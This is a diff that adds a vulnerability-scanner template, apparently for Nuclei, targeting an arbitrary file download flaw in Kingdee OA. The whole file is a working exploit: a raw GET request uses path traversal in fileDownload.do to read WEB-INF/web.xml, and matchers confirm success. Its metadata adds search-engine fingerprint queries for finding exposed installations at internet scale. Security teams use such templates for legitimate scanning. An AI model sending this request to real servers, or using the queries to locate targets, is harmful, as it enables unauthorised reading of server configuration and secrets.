@@ -1,0 +1,29 @@
+id: kingdee-oa-fileDownload-filedownload
+info:
+  name: 金蝶 OA fileDownload.do - filedownload
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="document.form_static.j_password.value"
+    hunter-query: web.body="/oa/scripts/cookie.js" | fofa 那个指纹 hunter涉黑 没数据
+    quake-query: body:"document.form_static.j_password.value"
+    zoomeye-query: app:"金蝶 OA"  | 涉黑 被保护
+  tags: kingdee,filedownload,kingdee-oa
+
+http:
+  - raw:
+      - |
+        GET /oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','filter-mapping')
+        condition: and
